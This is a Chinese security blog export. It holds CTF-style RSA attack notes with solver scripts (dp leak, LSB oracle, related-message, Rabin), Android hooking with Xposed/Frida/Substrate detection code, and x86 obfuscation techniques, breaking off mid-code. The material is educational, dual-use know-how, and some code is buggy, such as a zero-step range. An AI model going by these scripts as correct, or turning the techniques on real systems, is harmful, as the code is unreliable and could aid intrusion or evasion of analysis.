假设题目仅给出\(p,q,dp,dq,c\),即不给公钥\(e\). \[ \begin{align} d ∗ e &amp;\equiv 1 \pmod{ϕ(n)}\\ dp &amp;\equiv d \pmod{p−1}\\ dq &amp;\equiv d \pmod{q−1}\\ \end{align} \] 由中国剩余定理可得. \[ \begin{cases} m_1 &amp;\equiv c^d \pmod{p}\\ m_2 &amp;\equiv c^d \pmod{q}\\ \end{cases} \] \[ \begin{align} m_1 &amp;\equiv c^d \pmod{p}\\ &amp;\equiv c^{dp+k*(p-1)} \pmod{p}\\ &amp;\equiv c^{dp} \pmod{p}\\ \end{align} \] \(m_2\)同理. \[ \begin{align} c^d &amp;= kp + m_1\\ m_2 &amp;\equiv (kp+m_1) \pmod{q}\\ (m_2-m_1) &amp;\equiv kp \pmod{q}\\ gcd(p,q) = 1 &amp;\Rightarrow (m_2-m_1) * p^{-1} \equiv k \pmod{q}\\\ m &amp;\equiv c^d \pmod{n}\\ &amp;\equiv (kp + m_1) \pmod{n}\\ &amp;\equiv (((m_2-m_1) * p^{-1} \pmod{q})p + m_1) \pmod{n}\\ \end{align} \] 1234567891011import gmpy2import binasciidef decrypt(dp,dq,p,q,c): InvQ = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m=(((mp - mq) * InvQ) % p) * q + mq print (binascii.unhexlify(hex(m)[2:]))decrypt(dp, dq, p, q, c) dp泄露 假设题目给出公钥\(n,e\)以及\(dp\). \[ \begin{align} d ∗ e &amp;\equiv 1 \pmod{ϕ(n)}\\ dp &amp;\equiv d \pmod{p−1}\\ dp ∗ e &amp;\equiv d ∗ e \pmod{p−1}\\ d ∗ e &amp;= k_1 ∗ (p−1) + dp ∗ e\\ k_1 ∗ (p−1) + dp ∗ e &amp;\equiv 1 \pmod{ϕ(n)}\\ k_2 ∗ (p−1) ∗ (q−1) + 1 &amp;= k1 ∗ (p−1) + dp ∗ e\\ (p−1) ∗ [k2 ∗ (q−1) − k1] + 1 &amp;= dp ∗ e\\ dp &lt; p − 1 &amp;\Rightarrow e &gt; k2 ∗ (q−1) − k1 \end{align} \] 这里可以遍历\((0,e)\),通过\((k2 ∗ (q−1) − k1)*(p−1) + 1 = dp * e\)求出\(p - 1\),验证\(p\)能否被\(n\)整除. 1234567891011import gmpy2import libnumfor i in range(1, e + 1): if (dp * e - 1) % i == 0: if n % (((dp * e - 1) / i) + 1) == 0: p = ((dp * e - 1) / i) + 1 q = n / p phi = (p - 1)*(q - 1) d = gmpy2.invert(e, phi) % phi print libnum.n2s(pow(c, d, n)) Least-Significant-Bit Oracle Attack 假如用户知道公钥中\(N\),\(e\),\(c\),并且可以任意构造密文\(c1\),返回此密文解密后\(p1\)的末尾某些比特位的性质(记为函数\(f\)),可以通过\(f\)求出明文. 假设函数\(f\)是表示\(p1\)的奇偶性.攻击者得到密文\(C = P^e \pmod{N}\),将其乘以\(2^e \pmod{N}\),并作为密文发送出去. 返回值为\(f(2P)\).如果\(f(2P)\)返回的最后一位是\(0\),那么\(P &lt; \frac{N}{2}\),如果\(f(2P)\)返回的最后一位是\(1\),那么\(P &gt; \frac{N}{2}\). 同理可以获取\(f(2P)\)和\(f(4P)\).如果返回的是\((0,0)\),那么有\(P &lt; \frac{N}{4}\),如果返回的是\((0,1)\),那么有\(\frac{N}{4} &lt; P \frac{N}{2}\),如果返回的是\((0,1)\),那么有\(\frac{N}{2} &lt; P &lt; \frac{3N}{4}\),如果返回的是\((1,1)\),那么有\(\frac{3N}{4} &lt; P &lt; N\). 1234567891011121314151617181920from Crypto.Util.number import *from Crypto.PublicKey import RSAimport randomflag = "CTF&#123;this_is_my_test_flag&#125;"m = bytes_to_long(flag)key = RSA.generate(1024)c = pow(m, key.e, key.n)print("Welcome to BACKDOORCTF17\n")print("PublicKey:\n")print("N = " + str(key.n) + "\n")print("e = " + str(key.e) + "\n")print("c = " + str(c) + "\n")while True: try: temp_c = int(raw_input("temp_c = ")) temp_m = pow(temp_c, key.d, key.n) except: break l = str(((temp_m &amp; 5) * random.randint(1, 10000)) % (2 * (random.randint(1, 10000)))) print "l = " + l 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import libnumimport refrom binascii import unhexlifydef oracle(c): l = [] for i in range(20): p.sendline(str(c)) s = p.recvuntil("temp_c") l.append(int(re.findall("l\s*=\s*([0-9]*)", s)[0])) flag0 = 0 flag2 = 0 for i in range(20): if l[i] % 2 != 0: flag0 = 1 if l[i] &gt; 10000: flag2 = 1 return [flag2, flag0]def main(): ss = p.recvuntil("temp_c") N = int(re.findall("N\s*=\s*(\d+)",ss)[0]) e = int(re.findall("e\s*=\s*(\d+)",ss)[0]) c = int(re.findall("c\s*=\s*(\d+)",ss)[0]) size = libnum.len_in_bits(N) c = (pow(2, e, N) * c) % N LB = 0 UB = N i = 1 while LB != UB: flag = oracle(c) if flag[1] % 2==0: UB = (LB + UB) / 2 else: LB = (LB + UB) / 2 c = (pow(2, e, N) * c) % N i += 1 for i in range(-128, 128, 0): LB += i if pow(LB, e, N) == C: print unhexlify(hex(LB)[2:-1]) exit(0)if __name__ == '__main__': main() p.interactive() Related Message Attack 存在\(padding\)的情况下,\(rsa\)也存在各种风险,若\(e=3\)则可以利用Related Message Attack. \[ \begin{align} c_1 \equiv (m+padding_1)^3 \pmod{n}\\ c_2 \equiv (m+padding_2)^3 \pmod{n}\\ M_1 = m+padding_1\\ M_2 = m+padding_2\\ M_1 = M_2-padding_2+padding_1\\ a = 1 \\ b = padding_1-padding_2\\ M_1 = aM_2+b\\ c1 \equiv a^3M_2^3+3(aM_2)^2b+3aM_2b^2+b^3 \pmod{n}\\ \end{align} \] 可以获得下面这个方程组,方程组的解为\(x \equiv M_2 \pmod{n}\). \[ \begin{cases} f(x)&amp;=ax+b \\ f(x)^e-c1 &amp;\equiv 0 \pmod{n}\\ x^e-c2 &amp;\equiv 0 \pmod{n}\\ \end{cases} \] \[ \begin{align} s(x) &amp;= x^e-c2 \equiv (x-M_2)*k_1 \pmod{n}\\ t(x) &amp;= f(x)^e-c1 \equiv (x-M_2)*k_2 \pmod{n}\\ \end{align} \] \(k_1,k_2\)为多项式.\(gcd(k_1,k_2)=1 \Rightarrow gcd(s(x),t(x))=x-M_2\). 最后求得\(m \equiv \frac{\frac{3b(a^3c_2-b^3)}{c1-a^3c_2+2b^3}+b}{a}-padding2 \pmod{n}\). 123456789101112def getM2(a, b, c1, c2, n): a3 = pow(a, 3, n) b3 = pow(b, 3, n) first = c1 - a3 * c2 + 2 * b3 first = first % n second = 3 * b * (a3 * c2 - b3) second = second % n third = second * gmpy2.invert(first, n) third = third % n fourth = (third + b) * gmpy2.invert(a, n) return fourth % nm = getM2(a, b, c1, c2, n) - padding2 若\(e\)不为\(3\),但\(padding\)过短,则可以利用Coppersmith’s short-pad attack. e与phi(n)不互素 RSA衍生算法-Rabin算法 \(Rabin\)算法的特征在于\(e = 2\).加密过程和\(RSA\)一样. \(c = m^2 \pmod{n}\) 解密过程. \[ \begin{align} m_p &amp;\equiv \sqrt{c} \pmod{p}\\ m_q &amp;\equiv \sqrt{c} \pmod{q}\\ \mbox{用扩展欧几里得算法解:}y_p \cdot p + y_q \cdot q &amp;= 1\\ a &amp;= (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p) \bmod n\\ b &amp;= n - a\\ c &amp;= (y_p \cdot p \cdot m_q - y_q \cdot q \cdot m_p) \bmod n\\ d &amp;= n - c\\ \end{align} \] 如果\(p\),\(q\)模\(4\)余\(3\)的不同素数,则. \[ m_p = c^{\frac{1}{4}(p+1)} \bmod p\\ m_q = c^{\frac{1}{4}(q+1)} \bmod q\\ \] 证明. \[ \begin{align} a^2 &amp;\equiv (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p)^2 \equiv (y_p \cdot p \cdot m_q)^2 + (y_q \cdot q \cdot m_p)^2 \pmod{n}\\ m_q^2 &amp;= k_1q + c,m_p^2 = k_2p + c\\ a^2 &amp;\equiv c(a^2 \cdot p^2 + b^2 \cdot q^2) \pmod{n}\\ a^2 &amp;\equiv c((a \cdot p + b \cdot q)^2 - 2a \cdot p \cdot b \cdot q) \equiv c \pmod{n}\\ \end{align} \] 小性质:\(p = gcd(|r-s|,n)\). p,q模4不余3 由\(m^2 \equiv c \pmod{n}\)分解为两个同余式:\(m^2 \equiv c \pmod{p},m^2 \equiv c \pmod{q}\). 可以用二次同余方程的通用解法得到\(m \equiv C1 \pmod{p}\)和\(m \equiv C2 \pmod{q}\).其中\(C1\)和\(C2\)均有两个不同的解,然后再用中国剩余定理联立上面两个方程就能解得\(m \equiv M \pmod{n}\). 二次同余方程解法的通用算法可以参考Cipolla's algorithm.这个算法主要处理形如\(x^2 \equiv n \pmod{p}\),其中\(p\)是奇素数的方程的\(x\)的解. 设\(a\)满足\(w=a^2-n\)且不是模\(p\)的二次剩余,由欧拉定理:\(w^{\frac{p-1}{2}} \equiv -1 \pmod{p}\),则\(x \equiv (a + \sqrt{w})^{\frac{p+1}{2}}\). 主要的问题是根号\(w\)可能是负数,可以定义实部和虚部利用快速幂算法进行计算,使得最终结果抵消掉根号,时间复杂度为O(log N). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from Crypto.Util.number import getPrimefrom random import randintfrom libnum import *from gmpy2 import *def power(s1, s2, k1, k2, w, p): return ((s1 * k1 + s2 * k2 * w) % p, (s1 * k2 + s2 * k1) % p)def Cipolla_algorithm(p, n): a = randint(1, p) w = a ** 2 - n while pow(w, (p - 1) / 2, p) != p - 1: a = randint(1, p) w = a ** 2 - n times = (p + 1) / 2 k1 = 1 k2 = 0 first = True sum1 = 1 sum2 = 0 while times != 0: if first: k1, k2 = power(k1, k2, a, 1, w, p) first = False else: k1, k2 = power(k1, k2, k1, k2, w, p) if times &amp; 1: sum1, sum2 = power(sum1, sum2, k1, k2, w, p) times &gt;&gt;= 1 return sum1def CRT(c, n): for i in range(len(n)): for j in range(i + 1, len(n)): assert gcd(n[i], n[j]) == 1 assert len(c) == len(n) N = reduce(lambda a, b: a * b, n) x = 0 for i, j in zip(c, n): N_i = N / j N_i_1 = invert(N_i, j) x += i * N_i * N_i_1 return x % Nif __name__ == '__main__': p = getPrime(512) while p % 4 != 1: p = getPrime(512) q = getPrime(512) while q % 4 != 1: q = getPrime(512) n = p * q m = s2n('this is plaintext') c = pow(m, 2, n) print 'm is '+str(m) get_x1 = Cipolla_algorithm(p, c) get_x2 = Cipolla_algorithm(q, c) assert pow(get_x1, 2, p) == c % p assert pow(get_x2, 2, q) == c % q c11 = get_x1 c12 = p - get_x1 c21 = get_x2 c22 = q - get_x2 print 'possible m :' + str(CRT([c11, c21], [p, q])) print 'possible m :' + str(CRT([c11, c22], [p, q])) print 'possible m :' + str(CRT([c12, c21], [p, q])) print 'possible m :' + str(CRT([c12, c22], [p, q])) n次同余方程 题目给的是\(m^e \equiv c \pmod{n}\),其中\(p\),\(q\)已知但是\(e\)和\(\phi(n)\)不互素的话,就可以先解出\(m^2 \equiv c \pmod{p},m^2 \equiv c \pmod{q}\)再用\(CRT\)联合. 针对\(m^3 \equiv c \pmod{p}\),\(python\)有\(sympy\)库可以进行处理,算法应该是利用的原根进行计算,所以当\(p\)比较大的时候计算也是很难的,而且也不是一定有原根的. 123456789from Crypto.Util.number import getPrimefrom random import randintfrom sympy.ntheory.residue_ntheory import nthroot_modp = getPrime(150)x = randint(1, p)n = pow(x, 4, p)x1 = nthroot_mod(n, 4, p, all_roots = False)assert pow(x1, 4, p) == nprint x1 e = prime * 2^k \(Rsabin(hitcon-2015)\). \(c= m^e = m^{e_0∗2} = (m^{e_0})^2\pmod{N}\),通过Rabin解密算法得到四个可能的\(m^{e_0}\),令\(c=m^{e_0}\),递归调用上式,直到\(m^{e_0}\)为素数,即可正常求解. 1234567partially_decoded_ct = [ct]for i in range(5): new_partially_decoded_ct = [] for ct_p in partially_decoded_ct: new_ct_p = rabin.decrypt(ct_p) new_partially_decoded_ct.extend(list(new_ct_p)) partially_decoded_ct = set(new_partially_decoded_ct) 素数因子较小 计算\(x^e=c mod p\)可能的根\(x\),即为明文\(m\)对素数因子\(p\)的余数,依次求出\(m\)对所有素数因子的余数,再利用中国剩余定理\(CRT\)即可求得明文\(m\). e与φ(n)不互素时 12345678910n1 = 0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723e1 = 0xfae3ac1 = 0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbean2 = 0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63e2 = 0x1f9eaec2 = 0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347assert pow(flag, e1, n1) == c1assert pow(flag, e2, n2) == c2assert gcd(e1, (p1 - 1)*(q1 - 1)) == 14assert gcd(e2, (p2 - 1)*(q2 - 1)) == 14 \[ \begin{align} gcd(e,\phi(n)) &amp;= b\\ ed &amp;\equiv 1 \pmod{\phi(n)}\\ e = a * b\\ abd &amp;\equiv 1 \pmod{\phi(n)}\\ c^bd \equiv m^{abbd} \equiv m^b \pmod{n}\\ \end{align} \] \(e,b,a\)已知,可以求出\(bd\)(\(a\)模\(\phi(n)\)的逆元).可以得到:\(m^b \pmod{n_1},m^b \pmod{n_2}\).进一步求出\(m^b \pmod{q_1},m^b \pmod{q_2}\),然后\(CRT\)合并求出\(m^b \pmod{q_1q_2}\). 此时可以当做一个新的\(RSA\)题目:密文等于中国剩余定理求出的\(m\)特解,公钥等于\(b\),模数已经分解为\(q1\)和\(q2\). 这里的\(e\)和\(\phi\)又不是互素的,有公约数\(2\),由于\(2\)次方太小,所以重复一次将\(e\)变成\(2\)然后直接对\(m\)开方即可. 1234567891011121314151617181920212223242526from libnum import *import gmpy2p = gcd(n1, n2)q1 = n1 / pq2 = n2 / pf1 = (p - 1) * (q1 - 1)f2 = (p - 1) * (q2 - 1)e1 = e1 / gcd(e1, e2)e2 = e2 / gcd(e1, e2)d1 = invmod(e1, f1)d2 = invmod(e2, f2)m1 = pow(c1, d1, n1)m2 = pow(c2, d2, n2)m3 = m1 % pm2 = m2 % q2m1 = m1 % q1m = solve_crt([m1, m2, m3], [q1, q2, p]) n = q1 * q2f = (q1 - 1) * (q2 - 1)m = m % nd = invmod(7, f)m = pow(m, d, n)print n2s(gmpy2.iroot(m, 2)[0]) e整除N的欧拉函数(p-1)和(q-1) \(easyRSA(NCTF-2019)\):https://blog.soreatu.com/posts/intended-solution-to-crypto-problems-in-nctf-2019/#easyrsa909pt-2solvers. 先用Adleman-Manders-Miller rth Root Extraction Method在\(GF(p)\)和\(GF(q)\)上对\(c\)开\(e\)次根,分别得到一个解. 然后去找到所有的\(0x1336\)个primitive nth root of 1,乘以上面那个解,得到所有的\(0x1337\)个解. 再用\(CRT\)对\(GF(p)\)和\(GF(q)\)上的两组\(0x1337\)个解组合成\(mod n\)下的解,可以得到\(0x1337**2==24196561\)个mod n的解.最后能通过\(check\)的即为\(flag\).]]></content>
      <categories>
        <category>IS</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>非对称加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Android-hook]]></title>
    <url>%2Fposts%2Fbd1636bf%2F</url>
    <content type="text"><![CDATA[概览 目前Android主流的hook框架有:Xposed,Substrate和frida. Xposed Xposed是一个在andoid平台上比较成熟的hook框架,可以完美的在dalvik虚拟机上做到hook任意java方法. Android系统中所有的app进程都是有zygote进程孵化而来的,而Zygote进程是由Init进程启动的,Zygote进程在启动时会创建一个Dalvik虚拟机实例,每当它孵化一个新的应用程序进程时,都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去,从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例. Xposed会替换/system/bin/app_process文件,替换后的app_process在启动过程中会加载XposedBridge.jar这个jar包,从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持. 由于需要替换app_process,故需要root或在recovery下刷机,然后重启手机后生效.Xposed在开机的时候完成对所有的Hook Function的劫持,在原Function执行的前后加上自定义代码. 使用方法 首先配置AndroidManifest.xml,需在Application Node中添加三个Meta(xposedmodule,xposedminversion和xposeddescription). 12345678910111213141516171819&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.example.xposedtest" android:versionCode="1" android:versionName="1.0" &gt; &lt;uses-sdk android:minSdkVersion="14" android:targetSdkVersion="19" /&gt; &lt;application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/AppTheme" &gt; &lt;span style="color:#ff0000;"&gt; &lt;!-- 以下三个为需要添加的meta--&gt; &lt;meta-data android:value="true" android:name="xposedmodule"/&gt; &lt;meta-data android:value="30" android:name="xposedminversion"/&gt; &lt;meta-data android:value="this is a test" android:name="xposeddescription"/&gt;&lt;/span&gt; &lt;/application&gt; &lt;/manifest&gt; 然后assets目录下新建一个xposed_init文件,重写XC_MethodHook的两个方法beforeHookedMethod和afterHookedMethod. 123456789101112131415161718192021222324252627282930313233343536package com.example.xposedtest;import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;import android.graphics.Color;import android.util.Log;import de.robv.android.xposed.XposedBridge;import android.widget.TextView;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;public class XposedTest implements IXposedHookLoadPackage &#123; public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable &#123; if(!lpparam.packageName.equals("com.android.systemui")) &#123; XposedBridge.log("not found package"); return; &#125; //找到要Hook的类名和函数，创建自己的类 findAndHookMethod("com.android.systemui.statusbar.policy.Clock", lpparam.classLoader, "updateClock", new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; // 这里的调用在正常函数调用之前执行 &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; // 这里的调用在正常函数调用之后执行 XposedBridge.log("aaaaaaaaaaaaaa" + lpparam.packageName); TextView tv = (TextView)param.thisObject; String text = tv.getText().toString(); tv.setText(text + ":)"); tv.setTextColor(Color.RED); &#125; &#125; ); &#125;&#125; hook检测 通过PackageManager查看安装列表,判断是否有安装Xposed Installer相关的软件包. 1234567PackageManager packageManager = context.getPackageManager();List applicationInfoList = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);for (ApplicationInfo applicationInfo: applicationInfoList) &#123; if (applicationInfo.packageName.equals("de.robv.android.xposed.installer")) &#123; // Xposed find &#125;&#125; 通常情况下使用Xposed Installer框架都会屏蔽对其的检测,即Hook掉PackageManager的getInstalledApplications方法的返回值,以便过滤掉de.robv.android.xposed.installer来躲避这种检测. 根据调用栈判断,Xposed Installer框架对每个由Zygote孵化的App进程都会介入,因此在程序方法异常栈中就会出现Xposed相关的信息,可以通过制造异常Exception来读取异常堆栈,检查其中是否存在Xposed的调用方法. 1234567try &#123; throw new Exception("blah");&#125; catch(Exception e) &#123; for (StackTraceElement stackTraceElement: e.getStackTrace()) &#123; // stackTraceElement.getClassName() stackTraceElement.getMethodName() 是否存 在Xposed &#125;&#125; 以下为使用xposed的调用栈. 12345678910111213E/GEnvironment: no such table: preference (code 1): while compiling: SELECT keyguard_show_livewallpaper FROM preference...at com.meituan.test.extpackage.ExtPackageManager.checkUpdate(ExtPackageManager.java:127)at com.meituan.test.MiFGService$1.run(MiFGService.java:41)at android.os.Looper.loop(Looper.java:136)at android.app.ActivityThread.main(ActivityThread.java:5072)at java.lang.reflect.Method.invokeNative(Native Method)at java.lang.reflect.Method.invoke(Method.java:515)...at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:609)at de.robv.android.xposed.XposedBridge.main(XposedBridge.java:132) //发现Xposed模块at dalvik.system.NativeStart.main(Native Method) 读取/proc/self/maps判断,无论在Java层做何种检测,Xposed都可以通过Hook相关的API并返回指定的结果来绕过检测,在Native层读取/proc/self/maps文件,判断App自身加载的库中是否存在XposedBridge.jar,相关的Dex,Jar和So库等文件. 1234567891011121314151617bool is_xposed() &#123; bool rel = false; FILE * fp = NULL; char* filepath = "/proc/self/maps"; string xp_name = "XposedBridge.jar"; fp = fopen(filepath, "r"); while (!feof(fp)) &#123; fgets(strLine, BUFFER_SIZE, fp); origin_str = strLine; str = trim(origin_str); if (contain(str, xp_name)) &#123; rel = true; break; &#125; &#125; return rel;&#125; Frida frida是一个跨平台的hook框架,可以hook Java和native层,且不需要每次都重启手机. hook对抗 遍历进程,判断frida-server是否运行. 1234567891011121314public boolean checkRunningProcesses() &#123; boolean returnValue = false; List&lt;RunningServiceInfo&gt; list = manager.getRunningServices(300); if(list != null)&#123; String tempName; for(int i=0;i&lt;list.size();++i)&#123; tempName = list.get(i).process; if(tempName.contains("fridaserver")) &#123; returnValue = true; &#125; &#125; &#125; return returnValue;&#125; fridaserver默认的TCP端口是27047,可以检查这个端口是否开放. 1234567891011boolean is_frida_server_listening() &#123; struct sockaddr_in sa; memset(&amp;sa, 0, sizeof(sa)); sa.sin_family = AF_INET; sa.sin_port = htons(27047); inet_aton("127.0.0.1", &amp;(sa.sin_addr)); int sock = socket(AF_INET , SOCK_STREAM , 0); if (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -1) &#123; /* Frida server detected. Do something… */ &#125;&#125; 每个开放的端口发送D-Bus的认证消息,哪个端口回复了哪个就是fridaserver. 123456789101112131415161718for(i = 0 ; i &lt;= 65535 ; i++) &#123; sock = socket(AF_INET , SOCK_STREAM , 0); sa.sin_port = htons(i); if (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -1) &#123; __android_log_print(ANDROID_LOG_VERBOSE, APPNAME, "FRIDA DETECTION [1]: Open Port: %d", i); memset(res, 0 , 7); // send a D-Bus AUTH message. Expected answer is “REJECT" send(sock, "\x00", 1, NULL); send(sock, "AUTH\r\n", 6, NULL); usleep(100); if (ret = recv(sock, res, 6, MSG_DONTWAIT) != -1) &#123; if (strcmp(res, "REJECT") == 0) &#123; /* Frida server detected. Do something… */ &#125; &#125; &#125; close(sock);&#125; 在内存中扫描frida的库特征gadgets,例如字符串LIBFRIDA在所有frida-gadget和frida-agent的版本中都有出现. 1234567891011121314151617181920212223static char keyword[] = "LIBFRIDA";num_found = 0;int scan_executable_segments(char * map) &#123; char buf[512]; unsigned long start, end; sscanf(map, "%lx-%lx %s", &amp;start, &amp;end, buf); if (buf[2] == 'x') &#123; return (find_mem_string(start, end, (char*)keyword, 8) == 1); &#125; else &#123; return 0; &#125;&#125;void scan() &#123; if ((fd = my_openat(AT_FDCWD, "/proc/self/maps", O_RDONLY, 0)) &gt;= 0) &#123; while ((read_one_line(fd, map, MAX_LINE)) &gt; 0) &#123; if (scan_executable_segments(map) == 1) &#123; num_found++; &#125; &#125; if (num_found &gt; 1) &#123; /* Frida Detected */ &#125;&#125; Substrate Substrate适用于对native层的hook. hook对抗 读取/proc/self/maps,libsubstrate.so和libsubstrate-dvm.so两个文件为Substrate必载入的文件,当进程maps表中出现libsubstrate-dvm.so,可以尝试去load该so文件并调用MSJavaHookMethod方法,它会返回该方法的地址即判定为恶意模块. 123456789void * lookup_symbol(char * libraryname, char * symbolname) &#123; void *imagehandle = dlopen(libraryname, RTLD_GLOBAL | RTLD_NOW); if (imagehandle != NULL) &#123; void * sym = dlsym(imagehandle, symbolname); if (sym != NULL)&#123; return sym; &#125; &#125;&#125;]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Windows-指令混淆]]></title>
    <url>%2Fposts%2Fc825cff1%2F</url>
    <content type="text"><![CDATA[概念 软件的安全性严重依赖于代码复杂化后被分析者理解的难度,通过指令混淆,可以将原始的代码指令转换为等价但极其复杂的指令,从而尽可能地提高分析和破解的成本. 现代反汇编器有两种思路:线性扫描,从开头到结尾依次读取机器码并进行反汇编;递归下降,从程序入口向后反汇编,遇到条件跳转则分别从分支的地方继续反汇编,无条件跳转则尝试从目的指令继续反汇编; 常见的混淆方法 花指令 花指令就是在原始指令中插入一些虽然可以被执行但是没有任何作用的指令,它的出现只是为了扰乱分析,而且是针对反汇编器,调试器. 花指令大致可以分为可执行花指令和不可执行花指令两类:可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行;不可执行花指令指的是这部分花指令代码在程序的正常执行过程中不会被执行. 线性扫描很容易制造花指令,只要在跳转和目标之间插入长度较长的指令开头(例如E8,后接4个字节)即可使之后的所有指令解析错误,OllyDbg和windbg就是使用的线性扫描法. 递归下降则可以避开这种简单的花指令,跳过中间的脏字节.但对于jz + jnz + junkdata则会由于上下文无关的算法而对脏字节进行解析. 除此以外还有把call当jmp使用的手段,由于在编译器中call只会用来作为子程序/函数跳转的指令,因此IDA往往会将call的地址视作一个函数的起始地址,进而破坏整个函数的完整性. 1201003689 50 push eax0100368A 53 push ebx 加入花指令后. 12301003689 50 push eax0100368A EB 01 jmp short 0100368D0100368C FF53 6A call dword ptr [ebx+6A] 机器码EB 01 FF使得线性分析的反汇编器产生了误判.而在执行时,第二条指令会跳转到正确的位置,流程如下. 123401003689 50 push eax0100368A EB 01 jmp short 0100368D0100368C 90 nop0100368D 53 push ebx 代码变形 代码变形是指将单条或多条指令转变为等价的单条或多条其他指令.其中对单条指令的变形叫做局部变形,对多条指令结合起来考虑的变成叫做全局变形. 局部变形:mov eax, 12345678h使用push 12345678h;pop eax替代;jmp {label}使用push {label};ret替代. 12mov eax, ebxmov ecx, eax 因为两条代码具有关联性,在变形时需要综合考虑. 1234mov cx, bxmov ax, cxmov ch, bhmov ah, bh 扰乱指令序列 12345678901003689 push eax0100368A push ebx0100368B xor eax, eax0100368D cmp eax, 001003690 jne short 0100369501003692 inc eax01003693 jmp short 0100368D01003695 pop ebx01003696 pop eax 扰乱指令序列就是要打乱指令的排列方式,以干扰分析者. 123456789101112131401003689 push eax0100368A jmp short 010036940100368C xor eax, eax0100368E jmp short 0100369701003690 jne short 0100369F01003692 jmp short 0100369C01003694 push ebx01003695 jmp short 0100368C01003697 cmp eax, 00100369A jmp short 010036900100369C inc eax0100369D jmp short 010036970100369F pop ebx010036A0 pop eax 多分支 多分支是指利用不同的条件跳转指令将程序的执行流程复杂化,与扰乱指令序列不同的是多分支改变了程序的执行流. 123401003689 push eax0100368A push ebx0100368B push ecx0100368C push edx 1234567801003689 push eax0100368A je short 0100368F0100368C push ebx0100368D jmp short 010036930100368F push eax01003690 mov dword ptr [esp], ebx01003693 push ecx01003694 push edx 代码里加入了一个条件分支,但这段代码的执行结果和原代码相同. 不透明谓词 不透明谓词是指一个表达式的值在执行到某处时,对程序员而言是已知的,但编译器或静态分析器无法推断出这个值,只能在运行时确定. 12345678mov esi, 1... ; some code not touching esidec esi...cmp esi, 0jz real_code; fake luggagereal_code: 这里esi的值肯定是0,那么就可以在fake luggage处插入任意长度和复杂度的指令,以达到混淆的目的. 间接指针 12345678910111213141516171819dummy_data1 db 100h dup (0)message1 db &apos;hello world&apos;, 0dummy_data2 db 200h dup (0)message2 db &apos;another message&apos;, 0func proc ... mov eax, offset dummy_data1 add eax, 100h push eax call dump_string ... mov eax, offset dummy_data2 add eax, 200h push eax call dump_string ...func endp 这里通过dummy_data来间接地引用message,但IDA就不能正确地分析到对message的引用. 代码虚拟化 基于虚拟机的代码保护也可以算是代码混淆技术的一种,是目前各种混淆中保护效果最好的.简单地说就是通过许多模拟代码来模拟被保护的代码的执行,然后计算出与被保护代码执行时相同的结果. 当原始指令执行到指令序列的开始处,就转入代码虚拟机的入口.此时需要保存当前线程的上下文信息,然后进入模拟执行阶段,该阶段是代码虚拟机的核心. 有两种方案来保证虚拟机代码与原始代码的栈空间使用互不冲突:一种是在堆上开辟开辟新的空间;另一种是继续使用原始代码所使用的栈空间.这两种方案互有优劣,在实际中第二种使用较多. 模拟原始代码同样有两种方案:一种是将原本的指令序列转变为一种具有直接或者间接对应关系的,只有虚拟机才能理解的代码数据,例如用0来表示push,1表示mov等,这种直接或间接等价的数据称为 opcode;另一种方案是将原始代码的意义直接转换成新的代码,类似于代码变形,这种方案基于指令语义,所以设计难度非常大. 去混淆 去混淆就是逆向分析的时候去掉冗余的混淆指令,尽可能的把代码的原功能还原. 例如花指令,不同难度的花指令去除的方法也不同,一些通用性的花指令(JE/JMP)可以通过OllyDbg,IDA等第三方插件直接去除. 但对于针对性的花指令,就没那么好自动去除,还是需要手动分析.在手动分析去花前,尽可能的先去猜测分析目标程序的功能. 123456789101112131415161718void encrypt(uint32_t* v, uint32_t* k) &#123; uint32_t v0 